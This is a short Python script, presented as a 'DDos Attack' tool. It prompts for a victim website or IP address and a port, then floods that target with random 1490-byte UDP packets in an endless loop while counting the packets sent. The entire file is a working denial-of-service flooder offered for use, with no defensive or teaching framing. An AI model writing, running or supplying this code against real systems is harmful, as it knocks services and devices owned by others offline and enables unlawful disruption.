import socket
import os
import sys
import random
import time
from datetime import datetime


#initialise the socket to use IPv4 & UDP protocole
sockt = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")
os.system("figlet 'DDos Attack'")

victim = input("enter 'w' if your victim is a website, and 'l' if it's an electronic device : ")
if victim == 'w':
    host = input("Website you want to DDos: ")
    ip = socket.gethostbyname(host)
elif victim == 'l':
    ip = input("IP you want to DDos: ")
else :
    print("error !")
    exit

port = int(input("Port you want to attack: "))
pers_msg = input("Enter your personnal message or signatur if you wish: ")


os.system("clear")
os.system("figlet 'DDos Attack starting ...'")

print("preparing the attacl of the adress IP:",ip )
time.sleep(5)
sent = 0

while True:
    sockt.sendto(bytes,(ip,port))
    #sockt.send(bytes(pers_msg))
    sent +=1
    print("number of request sent:",sent)